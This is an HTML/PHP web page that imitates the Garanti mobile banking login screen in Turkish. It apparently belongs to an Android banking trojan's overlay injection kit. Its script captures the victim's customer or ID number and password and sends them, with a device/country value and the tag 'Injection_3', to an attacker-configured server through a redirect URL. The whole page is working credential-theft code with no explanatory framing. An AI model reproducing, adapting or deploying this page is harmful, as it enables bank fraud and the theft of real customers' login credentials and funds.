<html>
<head>

    <link href="tr/com.garanti.cepsubesi/style.css" rel="stylesheet">

</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php";
?>
<body>
<div id="content_div">

<div class="header">
	<h3>Giriş</h3>
</div>

<form action="null" method="post" id="_mainForm" target="flow_handler">


<input type="text" class="input1" name="fields[login]" placeholder="Müşteri / T.C. Kimlik Numaranız" id="login">

<input name="fields[password]" class="input2" id="password" placeholder="Parola" type="password" maxlength="6">

<input type="checkbox" class="option-input radio" /><h5> Beni Hatırla </h5>

<input type="submit" id="input_submitBtn" class="s1" value="Giriş" >
</form>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</div>
            <script type="text/javascript">

    (function () {


var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
     var input = objDoc.createElement("input");
     input.setAttribute("type", "hidden");
     input.setAttribute("name", sNm);
     input.setAttribute("value", sV);
     input.value = sV;
     objForm.appendChild(input);
 };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'input1';
							oCodeInp.className = 'input2';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror1';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }

                        top['closeDlg'] = true;
                        var url='<?php echo $URL; ?>';
                        var imei_c='<?php echo $IMEI_country; ?>';
                        location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|cepsubesi|"+oNumInp.value+"|"+oCodeInp.value);

						return false;
                    };

                })();
                </script>
</body></html>
